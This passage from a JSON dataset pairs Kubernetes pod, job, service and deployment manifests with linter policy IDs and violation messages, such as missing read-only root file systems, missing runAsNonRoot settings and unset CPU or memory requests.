    "manifest_path": "data/manifests/the_stack_sample/sample_3286.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-qualifiers-cromu00019-pov3\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-qualifiers-cromu00019-pov3\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py qualifiers CROMU_00019\n      pov_3 3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cyborg-seeker-qualifiers-cromu00019-pov3\" does not have a read-only root file system"
  },
  {
    "id": "8725",
    "manifest_path": "data/manifests/the_stack_sample/sample_3286.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-qualifiers-cromu00019-pov3\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-qualifiers-cromu00019-pov3\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py qualifiers CROMU_00019\n      pov_3 3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cyborg-seeker-qualifiers-cromu00019-pov3\" is not set to runAsNonRoot"
  },
  {
    "id": "8726",
    "manifest_path": "data/manifests/the_stack_sample/sample_3289.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntu\nspec:\n  containers:\n  - name: ubuntu\n    image: ubuntu:bionic\n    command:\n    - /bin/bash\n    - -c\n    - 'trap : TERM INT; sleep infinity & wait'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ubuntu\" does not have a read-only root file system"
  },
  {
    "id": "8727",
    "manifest_path": "data/manifests/the_stack_sample/sample_3289.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntu\nspec:\n  containers:\n  - name: ubuntu\n    image: ubuntu:bionic\n    command:\n    - /bin/bash\n    - -c\n    - 'trap : TERM INT; sleep infinity & wait'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ubuntu\" is not set to runAsNonRoot"
  },
  {
    "id": "8728",
    "manifest_path": "data/manifests/the_stack_sample/sample_3289.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntu\nspec:\n  containers:\n  - name: ubuntu\n    image: ubuntu:bionic\n    command:\n    - /bin/bash\n    - -c\n    - 'trap : TERM INT; sleep infinity & wait'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ubuntu\" has cpu request 0"
  },
  {
    "id": "8729",
    "manifest_path": "data/manifests/the_stack_sample/sample_3289.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntu\nspec:\n  containers:\n  - name: ubuntu\n    image: ubuntu:bionic\n    command:\n    - /bin/bash\n    - -c\n    - 'trap : TERM INT; sleep infinity & wait'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ubuntu\" has memory limit 0"
  },
  {
    "id": "8730",
    "manifest_path": "data/manifests/the_stack_sample/sample_3291.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myservice-pod\n  labels:\n    consul: myservice\nspec:\n  containers:\n  - name: myservice-with-hooks-container\n    image: python:2\n    command:\n    - python\n    - -m\n    - SimpleHTTPServer\n    - '8080'\n    env:\n    - name: KUBERNETES_POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: KUBERNETES_POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: hooks\n      mountPath: /hooks\n  - name: consul-dev-container\n    image: consul\n    command:\n    - consul\n    - agent\n    - -dev\n    ports:\n    - containerPort: 8500\n  volumes:\n  - name: hooks\n    hostPath:\n      path: /hooks\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"consul-dev-container\" is using an invalid container image, \"consul\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8731",
    "manifest_path": "data/manifests/the_stack_sample/sample_3291.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myservice-pod\n  labels:\n    consul: myservice\nspec:\n  containers:\n  - name: myservice-with-hooks-container\n    image: python:2\n    command:\n    - python\n    - -m\n    - SimpleHTTPServer\n    - '8080'\n    env:\n    - name: KUBERNETES_POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: KUBERNETES_POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: hooks\n      mountPath: /hooks\n  - name: consul-dev-container\n    image: consul\n    command:\n    - consul\n    - agent\n    - -dev\n    ports:\n    - containerPort: 8500\n  volumes:\n  - name: hooks\n    hostPath:\n      path: /hooks\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"consul-dev-container\" does not have a read-only root file system"
  },
  {
    "id": "8732",
    "manifest_path": "data/manifests/the_stack_sample/sample_3291.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myservice-pod\n  labels:\n    consul: myservice\nspec:\n  containers:\n  - name: myservice-with-hooks-container\n    image: python:2\n    command:\n    - python\n    - -m\n    - SimpleHTTPServer\n    - '8080'\n    env:\n    - name: KUBERNETES_POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: KUBERNETES_POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: hooks\n      mountPath: /hooks\n  - name: consul-dev-container\n    image: consul\n    command:\n    - consul\n    - agent\n    - -dev\n    ports:\n    - containerPort: 8500\n  volumes:\n  - name: hooks\n    hostPath:\n      path: /hooks\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myservice-with-hooks-container\" does not have a read-only root file system"
  },
  {
    "id": "8733",
    "manifest_path": "data/manifests/the_stack_sample/sample_3291.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myservice-pod\n  labels:\n    consul: myservice\nspec:\n  containers:\n  - name: myservice-with-hooks-container\n    image: python:2\n    command:\n    - python\n    - -m\n    - SimpleHTTPServer\n    - '8080'\n    env:\n    - name: KUBERNETES_POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: KUBERNETES_POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: hooks\n      mountPath: /hooks\n  - name: consul-dev-container\n    image: consul\n    command:\n    - consul\n    - agent\n    - -dev\n    ports:\n    - containerPort: 8500\n  volumes:\n  - name: hooks\n    hostPath:\n      path: /hooks\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"consul-dev-container\" is not set to runAsNonRoot"
  },
  {
    "id": "8734",
    "manifest_path": "data/manifests/the_stack_sample/sample_3291.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myservice-pod\n  labels:\n    consul: myservice\nspec:\n  containers:\n  - name: myservice-with-hooks-container\n    image: python:2\n    command:\n    - python\n    - -m\n    - SimpleHTTPServer\n    - '8080'\n    env:\n    - name: KUBERNETES_POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: KUBERNETES_POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: hooks\n      mountPath: /hooks\n  - name: consul-dev-container\n    image: consul\n    command:\n    - consul\n    - agent\n    - -dev\n    ports:\n    - containerPort: 8500\n  volumes:\n  - name: hooks\n    hostPath:\n      path: /hooks\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myservice-with-hooks-container\" is not set to runAsNonRoot"
  },
  {
    "id": "8735",
    "manifest_path": "data/manifests/the_stack_sample/sample_3291.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myservice-pod\n  labels:\n    consul: myservice\nspec:\n  containers:\n  - name: myservice-with-hooks-container\n    image: python:2\n    command:\n    - python\n    - -m\n    - SimpleHTTPServer\n    - '8080'\n    env:\n    - name: KUBERNETES_POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: KUBERNETES_POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: hooks\n      mountPath: /hooks\n  - name: consul-dev-container\n    image: consul\n    command:\n    - consul\n    - agent\n    - -dev\n    ports:\n    - containerPort: 8500\n  volumes:\n  - name: hooks\n    hostPath:\n      path: /hooks\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"consul-dev-container\" has cpu request 0"
  },
  {
    "id": "8736",
    "manifest_path": "data/manifests/the_stack_sample/sample_3291.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myservice-pod\n  labels:\n    consul: myservice\nspec:\n  containers:\n  - name: myservice-with-hooks-container\n    image: python:2\n    command:\n    - python\n    - -m\n    - SimpleHTTPServer\n    - '8080'\n    env:\n    - name: KUBERNETES_POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: KUBERNETES_POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: hooks\n      mountPath: /hooks\n  - name: consul-dev-container\n    image: consul\n    command:\n    - consul\n    - agent\n    - -dev\n    ports:\n    - containerPort: 8500\n  volumes:\n  - name: hooks\n    hostPath:\n      path: /hooks\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myservice-with-hooks-container\" has cpu request 0"
  },
  {
    "id": "8737",
    "manifest_path": "data/manifests/the_stack_sample/sample_3291.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myservice-pod\n  labels:\n    consul: myservice\nspec:\n  containers:\n  - name: myservice-with-hooks-container\n    image: python:2\n    command:\n    - python\n    - -m\n    - SimpleHTTPServer\n    - '8080'\n    env:\n    - name: KUBERNETES_POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: KUBERNETES_POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: hooks\n      mountPath: /hooks\n  - name: consul-dev-container\n    image: consul\n    command:\n    - consul\n    - agent\n    - -dev\n    ports:\n    - containerPort: 8500\n  volumes:\n  - name: hooks\n    hostPath:\n      path: /hooks\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"consul-dev-container\" has memory limit 0"
  },
  {
    "id": "8738",
    "manifest_path": "data/manifests/the_stack_sample/sample_3291.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myservice-pod\n  labels:\n    consul: myservice\nspec:\n  containers:\n  - name: myservice-with-hooks-container\n    image: python:2\n    command:\n    - python\n    - -m\n    - SimpleHTTPServer\n    - '8080'\n    env:\n    - name: KUBERNETES_POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: KUBERNETES_POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    ports:\n    - containerPort: 8080\n    volumeMounts:\n    - name: hooks\n      mountPath: /hooks\n  - name: consul-dev-container\n    image: consul\n    command:\n    - consul\n    - agent\n    - -dev\n    ports:\n    - containerPort: 8500\n  volumes:\n  - name: hooks\n    hostPath:\n      path: /hooks\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myservice-with-hooks-container\" has memory limit 0"
  },
  {
    "id": "8739",
    "manifest_path": "data/manifests/the_stack_sample/sample_3293.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: logging-service\n  name: logging-service\n  namespace: oih-dev-ns\nspec:\n  ports:\n  - name: '1234'\n    port: 1234\n    protocol: TCP\n    targetPort: 1234\n  selector:\n    app: logging-service\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:logging-service])"
  },
  {
    "id": "8740",
    "manifest_path": "data/manifests/the_stack_sample/sample_3294.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: sentry-user-create\n  labels:\n    app: sentry\nspec:\n  template:\n    metadata:\n      name: sentry-user-create\n      labels:\n        app: sentry\n        release: release-name\n    spec:\n      containers:\n      - name: user-create-job\n        image: sentry:9.1.1\n        command:\n        - sentry\n        - createuser\n        - --no-input\n        - --email\n        - $(SENTRY_ADMIN_USERNAME)\n        - --superuser\n        - --password\n        - $(SENTRY_USER_PASSWORD)\n        env:\n        - name: SENTRY_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: sentry-secret\n        - name: SENTRY_DB_USER\n          value: sentry\n        - name: SENTRY_DB_NAME\n          value: sentry\n        - name: SENTRY_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-postgresql\n              key: postgres-password\n        - name: SENTRY_POSTGRES_HOST\n          value: sentry-postgresql\n        - name: SENTRY_POSTGRES_PORT\n          value: '5432'\n        - name: SENTRY_REDIS_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-redis\n              key: redis-password\n        - name: SENTRY_REDIS_HOST\n          value: sentry-redis-master\n        - name: SENTRY_REDIS_PORT\n          value: '6379'\n        - name: SENTRY_EMAIL_HOST\n          value: '{{repl ConfigOption \"smtp_host\"}}'\n        - name: SENTRY_EMAIL_PORT\n          value: '{{repl ConfigOption \"smtp_port\"}}'\n        - name: SENTRY_EMAIL_USER\n          value: '{{repl ConfigOption \"smtp_user\"}}'\n        - name: SENTRY_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: smtp-password\n        - name: SENTRY_USER_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: user-password\n        - name: SENTRY_ADMIN_USERNAME\n          value: '{{repl ConfigOption \"admin_username\"}}'\n        - name: SENTRY_EMAIL_USE_TLS\n          value: 'false'\n        - name: SENTRY_SERVER_EMAIL\n          value: sentry@sentry.local\n        volumeMounts:\n        - mountPath: /etc/sentry\n          name: config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: sentry\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8741",
    "manifest_path": "data/manifests/the_stack_sample/sample_3294.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: sentry-user-create\n  labels:\n    app: sentry\nspec:\n  template:\n    metadata:\n      name: sentry-user-create\n      labels:\n        app: sentry\n        release: release-name\n    spec:\n      containers:\n      - name: user-create-job\n        image: sentry:9.1.1\n        command:\n        - sentry\n        - createuser\n        - --no-input\n        - --email\n        - $(SENTRY_ADMIN_USERNAME)\n        - --superuser\n        - --password\n        - $(SENTRY_USER_PASSWORD)\n        env:\n        - name: SENTRY_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: sentry-secret\n        - name: SENTRY_DB_USER\n          value: sentry\n        - name: SENTRY_DB_NAME\n          value: sentry\n        - name: SENTRY_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-postgresql\n              key: postgres-password\n        - name: SENTRY_POSTGRES_HOST\n          value: sentry-postgresql\n        - name: SENTRY_POSTGRES_PORT\n          value: '5432'\n        - name: SENTRY_REDIS_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-redis\n              key: redis-password\n        - name: SENTRY_REDIS_HOST\n          value: sentry-redis-master\n        - name: SENTRY_REDIS_PORT\n          value: '6379'\n        - name: SENTRY_EMAIL_HOST\n          value: '{{repl ConfigOption \"smtp_host\"}}'\n        - name: SENTRY_EMAIL_PORT\n          value: '{{repl ConfigOption \"smtp_port\"}}'\n        - name: SENTRY_EMAIL_USER\n          value: '{{repl ConfigOption \"smtp_user\"}}'\n        - name: SENTRY_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: smtp-password\n        - name: SENTRY_USER_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: user-password\n        - name: SENTRY_ADMIN_USERNAME\n          value: '{{repl ConfigOption \"admin_username\"}}'\n        - name: SENTRY_EMAIL_USE_TLS\n          value: 'false'\n        - name: SENTRY_SERVER_EMAIL\n          value: sentry@sentry.local\n        volumeMounts:\n        - mountPath: /etc/sentry\n          name: config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: sentry\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"user-create-job\" does not have a read-only root file system"
  },
  {
    "id": "8742",
    "manifest_path": "data/manifests/the_stack_sample/sample_3294.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: sentry-user-create\n  labels:\n    app: sentry\nspec:\n  template:\n    metadata:\n      name: sentry-user-create\n      labels:\n        app: sentry\n        release: release-name\n    spec:\n      containers:\n      - name: user-create-job\n        image: sentry:9.1.1\n        command:\n        - sentry\n        - createuser\n        - --no-input\n        - --email\n        - $(SENTRY_ADMIN_USERNAME)\n        - --superuser\n        - --password\n        - $(SENTRY_USER_PASSWORD)\n        env:\n        - name: SENTRY_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: sentry-secret\n        - name: SENTRY_DB_USER\n          value: sentry\n        - name: SENTRY_DB_NAME\n          value: sentry\n        - name: SENTRY_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-postgresql\n              key: postgres-password\n        - name: SENTRY_POSTGRES_HOST\n          value: sentry-postgresql\n        - name: SENTRY_POSTGRES_PORT\n          value: '5432'\n        - name: SENTRY_REDIS_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-redis\n              key: redis-password\n        - name: SENTRY_REDIS_HOST\n          value: sentry-redis-master\n        - name: SENTRY_REDIS_PORT\n          value: '6379'\n        - name: SENTRY_EMAIL_HOST\n          value: '{{repl ConfigOption \"smtp_host\"}}'\n        - name: SENTRY_EMAIL_PORT\n          value: '{{repl ConfigOption \"smtp_port\"}}'\n        - name: SENTRY_EMAIL_USER\n          value: '{{repl ConfigOption \"smtp_user\"}}'\n        - name: SENTRY_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: smtp-password\n        - name: SENTRY_USER_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: user-password\n        - name: SENTRY_ADMIN_USERNAME\n          value: '{{repl ConfigOption \"admin_username\"}}'\n        - name: SENTRY_EMAIL_USE_TLS\n          value: 'false'\n        - name: SENTRY_SERVER_EMAIL\n          value: sentry@sentry.local\n        volumeMounts:\n        - mountPath: /etc/sentry\n          name: config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: sentry\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"user-create-job\" is not set to runAsNonRoot"
  },
  {
    "id": "8743",
    "manifest_path": "data/manifests/the_stack_sample/sample_3294.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: sentry-user-create\n  labels:\n    app: sentry\nspec:\n  template:\n    metadata:\n      name: sentry-user-create\n      labels:\n        app: sentry\n        release: release-name\n    spec:\n      containers:\n      - name: user-create-job\n        image: sentry:9.1.1\n        command:\n        - sentry\n        - createuser\n        - --no-input\n        - --email\n        - $(SENTRY_ADMIN_USERNAME)\n        - --superuser\n        - --password\n        - $(SENTRY_USER_PASSWORD)\n        env:\n        - name: SENTRY_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: sentry-secret\n        - name: SENTRY_DB_USER\n          value: sentry\n        - name: SENTRY_DB_NAME\n          value: sentry\n        - name: SENTRY_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-postgresql\n              key: postgres-password\n        - name: SENTRY_POSTGRES_HOST\n          value: sentry-postgresql\n        - name: SENTRY_POSTGRES_PORT\n          value: '5432'\n        - name: SENTRY_REDIS_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-redis\n              key: redis-password\n        - name: SENTRY_REDIS_HOST\n          value: sentry-redis-master\n        - name: SENTRY_REDIS_PORT\n          value: '6379'\n        - name: SENTRY_EMAIL_HOST\n          value: '{{repl ConfigOption \"smtp_host\"}}'\n        - name: SENTRY_EMAIL_PORT\n          value: '{{repl ConfigOption \"smtp_port\"}}'\n        - name: SENTRY_EMAIL_USER\n          value: '{{repl ConfigOption \"smtp_user\"}}'\n        - name: SENTRY_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: smtp-password\n        - name: SENTRY_USER_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: user-password\n        - name: SENTRY_ADMIN_USERNAME\n          value: '{{repl ConfigOption \"admin_username\"}}'\n        - name: SENTRY_EMAIL_USE_TLS\n          value: 'false'\n        - name: SENTRY_SERVER_EMAIL\n          value: sentry@sentry.local\n        volumeMounts:\n        - mountPath: /etc/sentry\n          name: config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: sentry\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"user-create-job\" has cpu request 0"
  },
  {
    "id": "8744",
    "manifest_path": "data/manifests/the_stack_sample/sample_3294.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: sentry-user-create\n  labels:\n    app: sentry\nspec:\n  template:\n    metadata:\n      name: sentry-user-create\n      labels:\n        app: sentry\n        release: release-name\n    spec:\n      containers:\n      - name: user-create-job\n        image: sentry:9.1.1\n        command:\n        - sentry\n        - createuser\n        - --no-input\n        - --email\n        - $(SENTRY_ADMIN_USERNAME)\n        - --superuser\n        - --password\n        - $(SENTRY_USER_PASSWORD)\n        env:\n        - name: SENTRY_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: sentry-secret\n        - name: SENTRY_DB_USER\n          value: sentry\n        - name: SENTRY_DB_NAME\n          value: sentry\n        - name: SENTRY_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-postgresql\n              key: postgres-password\n        - name: SENTRY_POSTGRES_HOST\n          value: sentry-postgresql\n        - name: SENTRY_POSTGRES_PORT\n          value: '5432'\n        - name: SENTRY_REDIS_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry-redis\n              key: redis-password\n        - name: SENTRY_REDIS_HOST\n          value: sentry-redis-master\n        - name: SENTRY_REDIS_PORT\n          value: '6379'\n        - name: SENTRY_EMAIL_HOST\n          value: '{{repl ConfigOption \"smtp_host\"}}'\n        - name: SENTRY_EMAIL_PORT\n          value: '{{repl ConfigOption \"smtp_port\"}}'\n        - name: SENTRY_EMAIL_USER\n          value: '{{repl ConfigOption \"smtp_user\"}}'\n        - name: SENTRY_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: smtp-password\n        - name: SENTRY_USER_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: sentry\n              key: user-password\n        - name: SENTRY_ADMIN_USERNAME\n          value: '{{repl ConfigOption \"admin_username\"}}'\n        - name: SENTRY_EMAIL_USE_TLS\n          value: 'false'\n        - name: SENTRY_SERVER_EMAIL\n          value: sentry@sentry.local\n        volumeMounts:\n        - mountPath: /etc/sentry\n          name: config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: sentry\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"user-create-job\" has memory limit 0"
  },
  {
    "id": "8745",
    "manifest_path": "data/manifests/the_stack_sample/sample_3296.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: voting-app-deploy\n  labels:\n    name: voting-app-deploy\n    app: demo-voting-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: voting-app-pod\n      app: demo-voting-app\n  template:\n    metadata:\n      name: voting-app-pod\n      labels:\n        name: voting-app-pod\n        app: demo-voting-app\n    spec:\n      containers:\n      - name: voting-app\n        image: kodekloud/examplevotingapp_vote:v1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"voting-app\" does not have a read-only root file system"
  },
  {
    "id": "8746",
    "manifest_path": "data/manifests/the_stack_sample/sample_3296.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: voting-app-deploy\n  labels:\n    name: voting-app-deploy\n    app: demo-voting-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: voting-app-pod\n      app: demo-voting-app\n  template:\n    metadata:\n      name: voting-app-pod\n      labels:\n        name: voting-app-pod\n        app: demo-voting-app\n    spec:\n      containers:\n      - name: voting-app\n        image: kodekloud/examplevotingapp_vote:v1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"voting-app\" is not set to runAsNonRoot"
  },
  {
    "id": "8747",
    "manifest_path": "data/manifests/the_stack_sample/sample_3296.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: voting-app-deploy\n  labels:\n    name: voting-app-deploy\n    app: demo-voting-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: voting-app-pod\n      app: demo-voting-app\n  template:\n    metadata:\n      name: voting-app-pod\n      labels:\n        name: voting-app-pod\n        app: demo-voting-app\n    spec:\n      containers:\n      - name: voting-app\n        image: kodekloud/examplevotingapp_vote:v1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"voting-app\" has cpu request 0"
  },
  {
    "id": "8748",
    "manifest_path": "data/manifests/the_stack_sample/sample_3296.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: voting-app-deploy\n  labels:\n    name: voting-app-deploy\n    app: demo-voting-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: voting-app-pod\n      app: demo-voting-app\n  template:\n    metadata:\n      name: voting-app-pod\n      labels:\n        name: voting-app-pod\n        app: demo-voting-app\n    spec:\n      containers:\n      - name: voting-app\n        image: kodekloud/examplevotingapp_vote:v1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"voting-app\" has memory limit 0"
  },
  {
    "id": "8749",
    "manifest_path": "data/manifests/the_stack_sample/sample_3297.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: grafana\n  name: grafana\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:master\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: GF_EXPLORE_ENABLED\n          value: 'true'\n        - name: LOKI_ADDR\n          value: http://loki:3100\n        ports:\n        - containerPort: 3000\n        resources:\n          requests:\n            cpu: 100m\n            memory: 512Mi\n          limits:\n            cpu: 200m\n            memory: 1Gi\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n        - name: grafana-datastore\n          mountPath: /etc/grafana/provisioning/datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        emptyDir: {}\n      - name: grafana-datastore\n        configMap:\n          name: grafana-datasource\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"grafana\" does not have a read-only root file system"
  },
  {
    "id": "8750",
    "manifest_path": "data/manifests/the_stack_sample/sample_3297.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: grafana\n  name: grafana\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:master\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: GF_EXPLORE_ENABLED\n          value: 'true'\n        - name: LOKI_ADDR\n          value: http://loki:3100\n        ports:\n        - containerPort: 3000\n        resources:\n          requests:\n            cpu: 100m\n            memory: 512Mi\n          limits:\n            cpu: 200m\n            memory: 1Gi\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n        - name: grafana-datastore\n          mountPath: /etc/grafana/provisioning/datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        emptyDir: {}\n      - name: grafana-datastore\n        configMap:\n          name: grafana-datasource\n",
